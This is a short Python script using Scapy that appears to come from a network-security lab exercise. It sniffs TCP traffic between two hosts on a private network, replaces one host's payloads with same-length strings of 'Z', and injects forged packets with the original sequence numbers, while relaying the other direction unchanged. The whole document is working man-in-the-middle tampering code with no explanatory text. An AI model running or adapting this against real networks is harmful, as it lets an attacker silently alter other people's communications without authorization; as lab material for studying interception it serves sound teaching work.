#!/usr/bin/python3
from scapy.all import *

IP_A = "10.239.252.220"
IP_B = "10.239.252.51"
IP_M = "10.239.252.189"

def spoof(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw):

        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            data = pkt[Raw].load
            newdata = b"Z" * len(data)
            newpkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                     TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                         seq=pkt[TCP].seq, ack=pkt[TCP].ack,
                         flags=pkt[TCP].flags) / newdata

            send(newpkt, verbose=0)

        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
            send(pkt, verbose=0)

sniff(filter="tcp and not host " + IP_M, prn=spoof)